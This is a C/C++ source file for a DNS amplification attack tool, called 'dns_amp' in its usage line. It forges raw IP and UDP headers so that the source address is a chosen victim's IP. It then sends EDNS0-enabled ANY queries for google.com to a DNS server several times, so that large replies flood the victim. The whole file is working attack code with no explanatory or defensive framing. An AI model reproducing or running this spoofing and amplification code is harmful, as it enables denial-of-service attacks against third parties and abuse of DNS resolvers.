#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <linux/ip.h>  //iphdr
#include <linux/udp.h> //udphdr
#include <arpa/inet.h> //implicit declaration of function ‘inet_addr’; did you mean ‘ifr_addr’
using namespace std;


struct dns_query
{
    u_int16_t id;
    u_int16_t checkDisable;
    u_int16_t querys;
    u_int16_t answers;
    u_int16_t auth_rr;
    u_int16_t add_rr;
    unsigned char question[40];
};

struct edns0
{
    u_int8_t name;
    u_int16_t type;
    u_int16_t size;
    u_int8_t rcode;
    u_int8_t version;
    u_int32_t z;
};

struct ps_udphdr
{
    unsigned src;
    unsigned des;
    u_int8_t zero;
    u_int8_t ptcl;
    u_int16_t len;
    unsigned char udphdr[200];
};

// fabricate the DNS query
int setQueryName(unsigned char *start, string name, u_int16_t type, u_int16_t Class, int total_length);
// get the checksum of UDP/IP header
u_int16_t checksum(u_int16_t *buff, int _16bitword);


int main(int argc, char *argv[])
{
    // Create a UDP raw socket
    int sd, total_len = 0, size = 128, o = 1;
	unsigned char *sendbuff;
	
	if(argc<=3){
		printf("ERROR argc\n");
		printf("Usage:  sudo ./dns_amp <Victim_IP> <UDP_Source_Port> <DNS_Server_IP>\n");
		exit(-1);
	}
	
	//socket()
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd<0){
		printf("ERROR socket()\n");
        printf("check if you've add 'sudo'\n");
        exit(-1);
    }
    
    sendbuff = (unsigned char*)malloc(size); // increase in case of more data
    memset(sendbuff, 0, size);
	
    //the begin of sendbuff is IP header
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (const int*)(&o), sizeof(int))<0){
        printf("ERROR");
        exit(-1);
    }
	
	
    // Fabricate the IP header
    struct iphdr *iph = (struct iphdr*)sendbuff;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;          //general
    iph->id = htons(7582); //not important
    iph->ttl = 128;
    iph->protocol = IPPROTO_UDP; //IPPROTO_UDP=17
    iph->saddr = inet_addr(argv[1]);
    iph->daddr = inet_addr(argv[3]); // put destination IP address
	
    // Fabricate the UDP header
    struct udphdr *uh = (struct udphdr*)(sendbuff+sizeof(struct iphdr));
    uh->source = htons(atoi(argv[2]));
    uh->dest = htons(53);
    total_len = sizeof(struct udphdr)+sizeof(struct iphdr);
	
    // Fabricate the DNS query
    struct dns_query *q = (struct dns_query*)(sendbuff+sizeof(struct udphdr)+sizeof(struct iphdr));
    q->id = htons(u_int16_t(710893));
    q->checkDisable = htons(0x0100);
    q->querys = htons(1);
    q->answers = htons(0);
    q->auth_rr = 0;
    q->add_rr = htons(1);
    total_len = setQueryName((unsigned char*)q+6*sizeof(u_int16_t), "google.com", 255, 1, total_len+sizeof(u_int16_t)*6);
	
    // Fabricate additional request (EDNS0)
    edns0 *aq = (edns0*)(sendbuff+total_len);
    aq->type = htons(0x29);
    aq->size = htons(4096);
    total_len += sizeof(edns0);
	
    printf("packet size: %d byte(s)\n", total_len+14); // 14 is the size of "ethhdr"
	
    //total_len
    iph->tot_len = htons(total_len);
    uh->len = htons(total_len-sizeof(iphdr));
	
    // checksum of the UDP header
    ps_udphdr check;
    memset(&check, 0, sizeof(check));
    check.src = inet_addr(argv[1]);
    check.des = inet_addr(argv[3]);
    check.zero = 0;
    check.ptcl = 17;
    check.len = htons((total_len-sizeof(iphdr)));
    memcpy(check.udphdr, sendbuff+sizeof(iphdr), total_len-sizeof(iphdr));
    uh->check = checksum((u_int16_t*)(&check), ((sizeof(unsigned)*3+total_len-sizeof(iphdr)+1)/2)); // +1 beacuse size may be odd.
	
    // checksum of the IP header 
    iph->check = checksum((u_int16_t*)(sendbuff), (sizeof(struct iphdr)/2));
	
    // sockaddr
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(argv[3]);
	
    for (int i=0;i<5;i++){
        int send_len = sendto(sd, sendbuff, total_len, 0, (const struct sockaddr *)&sin, sizeof(struct sockaddr));
        if (send_len<0){
            printf("error in sending....sendlen = %d....errno = %d\n", send_len, send_len);
            return -1;
        }
    }
	
	
    return 0;
}

// fabricate the DNS query
int setQueryName(unsigned char *start, string name, u_int16_t type, u_int16_t Class, int total_length){
    int j = 0;
    
    for (int i=name.size()-1;i>=0;i--){
        if (name[i] != '.') j++;
        else{
            name[i] = j;
            j = 0;
        }
        start[i+1] = name[i];
    }
	
    start[0] = j;
    start[name.size()+3] = type;
    start[name.size()+5] = Class;
    return total_length+name.size()+5;
}

// get the checksum of UDP/IP header
u_int16_t checksum(u_int16_t *buff, int _16bitword){
    unsigned long sum;
    for (sum=0;_16bitword>0;_16bitword--) sum += *(buff)++;
    sum = ((sum>>16)+(sum&0xFFFF));
    sum += (sum>>16);
    return (u_int16_t)(~sum);
}
